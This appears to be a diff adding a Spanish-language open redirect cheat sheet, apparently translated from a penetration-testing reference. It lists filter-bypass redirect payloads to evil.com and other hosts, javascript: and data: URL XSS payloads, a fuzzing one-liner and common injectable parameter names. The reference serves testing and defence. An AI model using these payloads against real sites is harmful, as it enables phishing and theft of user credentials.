@@ -1,0 +1,127 @@
+Abrir redirección de URL
+Los redireccionamientos y reenvíos no validados son posibles cuando una aplicación web acepta entradas que no son de confianza, lo que podría hacer que la aplicación web redirija la solicitud a una URL contenida en entradas que no son de confianza. Al modificar la entrada de una URL que no es de confianza a un sitio malicioso, un atacante puede lanzar con éxito una estafa de phishing y robar las credenciales del usuario. Debido a que el nombre del servidor en el enlace modificado es idéntico al del sitio original, los intentos de phishing pueden tener una apariencia más confiable. Los ataques de redireccionamiento y reenvío no validados también se pueden utilizar para crear maliciosamente una URL que pase la verificación de control de acceso de la aplicación y luego reenvíe al atacante a funciones privilegiadas a las que normalmente no podría acceder.
+
+
+Resumen
+laboratorios
+Explotación
+Código de estado de redirección HTTP
+Fuzzing
+Omisión de filtro
+Parámetros de inyección comunes
+Referencias
+laboratorios
+Rootearme - HTTP - Redirección abierta
+PortSwigger: redirección abierta basada en DOM
+Explotación
+Una vulnerabilidad de redireccionamiento abierto ocurre cuando una aplicación web o un servidor utiliza información no validada proporcionada por el usuario para redirigir a los usuarios a otros sitios. Esto puede permitir a un atacante crear un enlace al sitio vulnerable que redirige a un sitio malicioso de su elección.
+
+Los atacantes pueden aprovechar esta vulnerabilidad en campañas de phishing, robo de sesiones u obligar a un usuario a realizar una acción sin su consentimiento.
+
+Considere este ejemplo: su aplicación web tiene una función que permite a los usuarios hacer clic en un enlace y ser redirigidos automáticamente a una página de inicio preferida guardada. Esto podría implementarse así:
+
+https://example.com/redirect?url=https://userpreferredsite.com
+Un atacante podría aprovechar una redirección abierta aquí reemplazándola userpreferredsite.compor un enlace a un sitio web malicioso. Luego podrían distribuir este enlace en un correo electrónico de phishing o en otro sitio web. Cuando los usuarios hacen clic en el enlace, son dirigidos al sitio web malicioso.
+
+Código de estado de redirección HTTP
+Los códigos de estado de redirección HTTP, los que comienzan con 3, indican que el cliente debe realizar acciones adicionales para completar la solicitud. Éstos son algunos de los más comunes:
+
+300 opciones múltiples : esto indica que la solicitud tiene más de una respuesta posible. El cliente deberá elegir uno de ellos.
+301 Movido permanentemente : esto significa que el recurso solicitado se ha movido permanentemente a la URL proporcionada por los encabezados de Ubicación. Todas las solicitudes futuras deben utilizar el nuevo URI.
+302 Encontrado : este código de respuesta significa que el recurso solicitado se ha movido temporalmente a la URL proporcionada por los encabezados de Ubicación. A diferencia del 301, no significa que el recurso se haya movido permanentemente, solo que está ubicado temporalmente en otro lugar.
+303 Ver otros : el servidor envía esta respuesta para indicarle al cliente que obtenga el recurso solicitado en otro URI con una solicitud GET.
+304 No modificado : se utiliza para fines de almacenamiento en caché. Le dice al cliente que la respuesta no ha sido modificada, por lo que el cliente puede continuar usando la misma versión almacenada en caché de la respuesta.
+305 Usar proxy : se debe acceder al recurso solicitado a través de un proxy proporcionado en el encabezado Ubicación.
+Redireccionamiento temporal 307 : esto significa que el recurso solicitado se ha movido temporalmente a la URL proporcionada por los encabezados de Ubicación y las solicitudes futuras aún deben usar el URI original.
+Redirección permanente 308 : esto significa que el recurso se ha movido permanentemente a la URL proporcionada por los encabezados de Ubicación y las solicitudes futuras deben usar la nueva URI. Es similar al 301 pero no permite cambiar el método HTTP.
+Fuzzing
+Reemplace www.whitelisteddomain.tldOpen -Redirect-payloads.txt con un dominio específico incluido en la lista blanca en su caso de prueba
+
+Para hacer esto, simplemente modifique el WHITELISTEDDOMAINvalor with www.test.com a la URL de su caso de prueba.
+
+WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
+Omisión de filtro
+Usar un dominio o una palabra clave incluidos en la lista blanca
+
+www.whitelisted.com.evil.com redirect to evil.com
+Uso de CRLF para omitir la palabra clave "javascript" en la lista negra
+
+java%0d%0ascript%0d%0a:alert(0)
+Uso de "//" y "////" para omitir la palabra clave "http" en la lista negra
+
+//google.com
+////google.com
+Uso de "https:" para omitir la palabra clave "//" en la lista negra
+
+https:google.com
+Usar "//" para omitir la palabra clave "//" en la lista negra (los navegadores ven // como //)
+
+\/\/google.com/
+/\/google.com/
+Usando "%E3%80%82" para omitir "." personaje en la lista negra
+
+/?redir=google。com
+//google%E3%80%82com
+Usando el byte nulo "%00" para omitir el filtro de lista negra
+
+//google%00.com
+Usando la contaminación de parámetros
+
+?next=whitelisted.com&next=google.com
+Usando el carácter "@", el navegador redirigirá a cualquier cosa después de "@"
+
+http://www.theirsite.com@yoursite.com/
+Creando carpeta como su dominio
+
+http://www.yoursite.com/http://www.theirsite.com/
+http://www.yoursite.com/folder/www.folder.com
+Usando "?" con caracteres, el navegador lo traducirá a "/?"
+
+http://www.yoursite.com?http://www.theirsite.com/
+http://www.yoursite.com?folder/www.folder.com
+Normalización de host/unicode dividido
+
+https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
+http://a.com／X.b.com
+XSS desde URL abierta: si está en una variable JS
+
+";alert(0);//
+XSS de datos:// contenedor
+
+http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
+XSS desde javascript:// contenedor
+
+http://www.example.com/redirect.php?url=javascript:prompt(1)
+Parámetros de inyección comunes
+/{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}
+Referencias
+Cargas útiles de redireccionamiento abierto - cujanovic
+Antipatrones explotables de host/división en la normalización Unicode - BlackHat US 2019
+Vulnerabilidad de redireccionamiento abierto - 15 DE AGOSTO DE 2018 - s0cket7
+OWASP - Hoja de referencia de redirecciones y reenvíos no validados
+Pentester Land - Hoja de trucos de redireccionamiento abierto
+No es necesario ejecutar 80 herramientas de reconocimiento para obtener acceso a las cuentas de usuario - @stefanocoding
